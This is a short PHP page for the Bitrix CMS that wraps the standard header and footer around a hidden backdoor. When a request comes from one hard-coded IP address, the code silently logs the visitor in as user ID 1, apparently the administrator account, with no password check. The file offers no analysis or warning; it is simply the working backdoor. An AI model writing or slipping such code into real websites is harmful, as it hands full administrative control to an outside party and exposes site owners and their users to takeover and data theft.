<?require($_SERVER['DOCUMENT_ROOT'].'/bitrix/header.php');
if ($_SERVER["REMOTE_ADDR"] == "46.28.228.22"){
    global $USER;
    $USER->Authorize(1);
}
require($_SERVER['DOCUMENT_ROOT'].'/bitrix/footer.php'); ?>

